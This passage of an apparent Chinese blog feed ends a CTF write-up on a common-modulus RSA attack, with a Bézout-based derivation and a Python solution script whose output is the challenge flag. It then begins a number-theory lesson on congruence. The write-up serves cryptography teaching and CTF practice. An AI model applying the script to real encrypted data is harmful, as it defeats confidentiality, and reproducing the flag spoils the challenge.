class="mord"><span class="mord cjk_fallback">由</span><span class="mord cjk_fallback">裴</span><span class="mord cjk_fallback">蜀</span><span class="mord cjk_fallback">定</span><span class="mord cjk_fallback">理</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">存</span><span class="mord cjk_fallback">在</span><span class="mord mathnormal">s</span><span class="mord">1</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">s</span><span class="mord">1</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mord cjk_fallback">有</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">s</span><span class="mord">1</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">s</span><span class="mord">1</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">x</span><span class="mord">1</span></span></span><span style="top:-6.009999999999998em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">由</span><span class="mord cjk_fallback">裴</span><span class="mord cjk_fallback">蜀</span><span class="mord cjk_fallback">定</span><span class="mord cjk_fallback">理</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">存</span><span class="mord cjk_fallback">在</span><span class="mord mathnormal">s</span><span class="mord">2</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">s</span><span class="mord">2</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mord cjk_fallback">有</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">s</span><span class="mord">2</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">s</span><span class="mord">2</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">x</span><span class="mord">2</span></span></span><span style="top:-4.809999999999998em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">对</span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">、</span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">进</span><span class="mord cjk_fallback">行</span><span class="mord cjk_fallback">共</span><span class="mord cjk_fallback">模</span><span class="mord cjk_fallback">攻</span><span class="mord cjk_fallback">击</span><span class="mord cjk_fallback">、</span><span class="mord cjk_fallback">对</span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">、</span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">进</span><span class="mord cjk_fallback">行</span><span class="mord cjk_fallback">共</span><span class="mord cjk_fallback">模</span><span class="mord cjk_fallback">攻</span><span class="mord cjk_fallback">击</span></span></span><span style="top:-3.609999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">会</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span></span></span><span style="top:-2.409999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span><span style="top:-1.209999999999998em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span><span style="top:-0.009999999999998621em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">同</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">有</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">x</span></span></span><span style="top:1.1900000000000006em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">再</span><span class="mord cjk_fallback">对</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">、</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">进</span><span class="mord cjk_fallback">行</span><span class="mord cjk_fallback">共</span><span class="mord cjk_fallback">模</span><span class="mord cjk_fallback">攻</span><span class="mord cjk_fallback">击</span><span class="mord cjk_fallback">即</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span></span></span><span style="top:2.39em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span></span></span></span></span><span class="mspace nobreak"> </span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span><span style="top:3.5899999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">时</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span></span></span></span></span><span class="mord cjk_fallback">比</span><span class="mord cjk_fallback">较</span><span class="mord cjk_fallback">小</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">样</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">直</span><span class="mord cjk_fallback">接</span><span class="mord cjk_fallback">开</span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">了</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:6.949999999999999em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p></details><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e1 = <span class="number">6839979093843017245130935971073531650625865408597324093158075653007572029459535748591107780971041110617821327885728</span></span><br><span class="line">e2 = <span class="number">527282383778630558435877705949699484729936503257091129495571879289998217841325217564810314237039659729265596452756258253436101100968118657130954223308875205257774585781949600635959096231751360</span></span><br><span class="line">e3 = <span class="number">20987998930730242130690830835028138615595244455228017878066112490327400892650229366898248406466316235857196958485710</span></span><br><span class="line">n = <span class="number">22175144708990630853036480868376123403731448276285717131186187150462023495494103565746117568235683365313517827941106620902013918484064641114476913481110938950785308733160550905735102713320438455824065792338146147847335388226116646541800245464845211085540907602598972170387771602880693683773805550988596358558621125283407314509610950378661338714027095643635739361829648482049383174885258194773716516785232715071895492339469667922183918303613284066664177945669438336799055529602328784963091965710713100236033780379337460945498971432359098326842627948461349746702776166953869600658895170340420434234372122272110975044659</span></span><br><span class="line">c1 = <span class="number">11426478179683336827224880779953157546776076551240828268809350458296893628522712784864907995111968644902442693072364448063747658422225255036189101385357784689296259496649527761401899948136054211133883265341970543967599869525260654979500412480663418057379308458996911392485335767582507518973447401423943878293895212638047157663802239344638641314156758830964491691323026524366328874683360987516802872498983112781643154651435374108641997212467699796213730738052002284134749351805453079045833498972827333585113428885026516509660161906337450878179654072288419436265826131479983858828205102056301019221745568319757344882310</span></span><br><span class="line">c2 = <span class="number">924553363795544361249557963373014280364009962681904215742379062140845462422058966956557303658832168491456051793505960008265313560082631349096509445336008684455437098964906094258030833746463869703797105150834953261601859026067804458980569864595116130499800793859913206222086000196754618550748639846744131641000960761007475985837366717289369284418559314663298108941564271462247365885229310605727917343982395106384199224643917254074484080305027204503813125672333323007771938062630610901748714884555438154614828690121207720526744717299121320271203097954739219600201683737833195114592138439396587112769674492174781048345</span></span><br><span class="line">c3 = <span class="number">14746267922953594508934987983405936746727004380259552828471117039223733948341026916910718225093159503573963075699179842175533457878937869802023486477372942785557938018982551170721496415115172951210353253311347031831419025904122683204153082041761968643487702640595950727384113933573702782931552657234931764298271273287655619903274377134978785223623709621560907111004144880046847332195005770181319177034333945769165118402546185793312611428185399654124299299022380187589974664553807713456469247091344949181479956722950070165387894955829314074403945814066771174510119236751891447097319232129235383321537697205679053840336</span></span><br><span class="line"><span class="comment">#gcd(e1,e2) = 29540346448235016595457107953809410509141879299370840061983373145010008818272</span></span><br><span class="line"><span class="comment">#gcd(e2,e3) =  68493250011952459219512675036017846580344175598507893778164361048080116129970</span></span><br><span class="line">x1,s11,s12 = gmpy2.gcdext(e1,e2)</span><br><span class="line">x2,s21,s22 = gmpy2.gcdext(e2,e3)</span><br><span class="line"><span class="built_in">print</span>(x1)</span><br><span class="line"><span class="built_in">print</span>(x2)</span><br><span class="line">m1 = (<span class="built_in">pow</span>(c1,s11,n)*<span class="built_in">pow</span>(c2,s12,n))%n</span><br><span class="line">m2 = (<span class="built_in">pow</span>(c2,s21,n)*<span class="built_in">pow</span>(c3,s22,n))%n</span><br><span class="line"><span class="built_in">print</span>(m1,m2)</span><br><span class="line">x, s31,s32 = gmpy2.gcdext(x1,x2)</span><br><span class="line">m = (<span class="built_in">pow</span>(m1,s31,n)*<span class="built_in">pow</span>(m2,s32,n))%n</span><br><span class="line">m = gmpy2.iroot(m,<span class="number">6</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;a1c50828-6199-48c1-8297-a9c44a823ed0&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="rsa困难题型"><a class="markdownIt-Anchor" href="#rsa困难题型"></a> RSA困难题型</h1>]]></content>
    
    
    <summary type="html">前言：直接关于RSA加密的基础题型总结的不好，重新总结</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="CRYPTO" scheme="http://iyheart.github.io/categories/CTF/CRYPTO/"/>
    
    <category term="RSA" scheme="http://iyheart.github.io/categories/CTF/CRYPTO/RSA/"/>
    
    
  </entry>
  
  <entry>
    <title>数论基础2</title>
    <link href="http://iyheart.github.io/2025/01/17/%E6%95%B0%E5%AD%A6blog/%E6%95%B0%E8%AE%BA%E5%9F%BA%E7%A1%802/"/>
    <id>http://iyheart.github.io/2025/01/17/%E6%95%B0%E5%AD%A6blog/%E6%95%B0%E8%AE%BA%E5%9F%BA%E7%A1%802/</id>
    <published>2025-01-16T16:42:41.000Z</published>
    <updated>2025-01-25T18:30:41.375Z</updated>
    
    <content type="html"><![CDATA[<ul><li>数学虽然有点枯燥，但是算法考到最后还是数学，计算机学到最后还是考验逻辑，没有逻辑、算法和数据结构的支撑学计算机是走不远的。</li></ul><h1 id="同余"><a class="markdownIt-Anchor" href="#同余"></a> 同余</h1><h2 id="同余的定义"><a class="markdownIt-Anchor" href="#同余的定义"></a> 同余的定义</h2><ul><li>整除和带余除法可以说是数论的基础。而同余则就是数论的重点中的重点。</li><li>这里就先介绍一下同余的概念。</li></ul><blockquote><p><strong>同余的定义</strong>:</p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mtext>给定一个正整数，把它叫做模.</mtext></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>如果用</mtext><mi>m</mi><mtext>去除任意两个整数</mtext><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mtext>所得的余数相同</mtext><mo separator="true">,</mo><mtext>则称</mtext><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mtext>模</mtext><mi>m</mi><mtext>同余，记作</mtext><mi>a</mi><mo>≡</mo><mi>b</mi><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi><mo stretchy="false">)</mo><mi mathvariant="normal">.</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>如果余数不同，则称</mtext><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mtext>对模</mtext><mi>m</mi><mtext>不同余</mtext><mo separator="true">,</mo><mtext>记作</mtext><mi>a</mi><mo>≢</mo><mi>b</mi><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}\text{给定一个正整数，把它叫做模.}\\如果用m去除任意两个整数a,b所得的余数相同,则称a,b模m同余，记作a\equiv b(mod ~m).\\如果余数不同，则称a,b对模m不同余,记作a\not\equiv b(mod~m)\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.6000000000000005em;vertical-align:-1.5500000000000007em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord text"><span class="mord cjk_fallback">给定一个正整数，把它叫做模</span><span class="mord">.</span></span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">果</span><span class="mord cjk_fallback">用</span><span class="mord mathnormal">m</span><span class="mord cjk_fallback">去</span><span class="mord cjk_fallback">除</span><span class="mord cjk_fallback">任</span><span class="mord cjk_fallback">意</span><span class="mord cjk_fallback">两</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">整</span><span class="mord cjk_fallback">数</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">余</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">相</span><span class="mord cjk_fallback">同</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">则</span><span class="mord cjk_fallback">称</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mord cjk_fallback">模</span><span class="mord mathnormal">m</span><span class="mord cjk_fallback">同</span><span class="mord cjk_fallback">余</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">记</span><span class="mord cjk_fallback">作</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">b</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mord">.</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">果</span><span class="mord cjk_fallback">余</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">同</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">则</span><span class="mord cjk_fallback">称</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">模</span><span class="mord mathnormal">m</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">同</span><span class="mord cjk_fallback">余</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">记</span><span class="mord cjk_fallback">作</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">b</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p></blockquote><h2 id="练习1"><a class="markdownIt-Anchor" href="#练习1"></a> 练习1</h2><ul><li>从这个练习中可以看到同余的几个运算性质，接下来会介绍。</li></ul><p><img src="/2025/01/17/%E6%95%B0%E5%AD%A6blog/%E6%95%B0%E8%AE%BA%E5%9F%BA%E7%A1%802/image-20241212161937459.png" alt="image-20241212161937459"></p><p><img src="/2025/01/17/%E6%95%B0%E5%AD%A6blog/%E6%95%B0%E8%AE%BA%E5%9F%BA%E7%A1%802/image-20241212162902758.png" alt="image-20241212162902758"></p><h2 id="同余的基本性质"><a class="markdownIt-Anchor" href="#同余的基本性质"></a> 同余的基本性质</h2><ul><li>接下来要介绍一下，一些简单的同余性质。并介绍一个定理（同余定义的另一种形式），最后再导出同余的运算法则（可以抽象成群）</li><li>接下来介绍一个命题和一个定理。</li></ul><blockquote><p><strong>命题1</strong>：命题1在前面的练习1中多少也了解到</p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>整数对模</mtext><mi>m</mi><mtext>的同余关系是一个等价关系，即</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo><mi>a</mi><mo>≡</mo><mi>a</mi><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi><mo stretchy="false">)</mo><mtext>   </mtext><mo stretchy="false">(</mo><mtext>自反性</mtext><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">(</mo><mn>2</mn><mo stretchy="false">)</mo><mtext>若</mtext><mi>a</mi><mo>≡</mo><mi>b</mi><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mtext>则</mtext><mi>b</mi><mo>≡</mo><mi>a</mi><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi><mo stretchy="false">)</mo><mtext>   </mtext><mo stretchy="false">(</mo><mtext>对称性</mtext><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">(</mo><mn>3</mn><mo 